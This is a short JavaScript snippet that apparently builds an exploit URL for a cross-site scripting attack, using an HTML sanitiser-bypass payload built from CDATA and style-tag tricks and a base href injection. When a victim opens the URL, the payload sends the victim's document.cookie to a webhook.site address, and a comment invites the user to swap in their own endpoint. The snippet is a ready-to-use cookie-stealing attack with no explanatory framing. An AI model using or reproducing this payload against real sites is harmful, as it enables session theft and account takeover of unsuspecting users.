// run this in browser console to get exploit url
ht = `<div><style><![CDATA[</style><div data-x="]]></style><iframe name='Page' /><base href='/**/+location.assign(location.hash.slice(1)+document.cookie)//' /><style><!--"></div><style>--></style></div>`
path = '/?html=' + encodeURIComponent(ht) + '#https://webhook.site/f71604a4-fc9b-4c99-9e0f-366529a29ac7?', // change this
console.log(path)
copy(path)
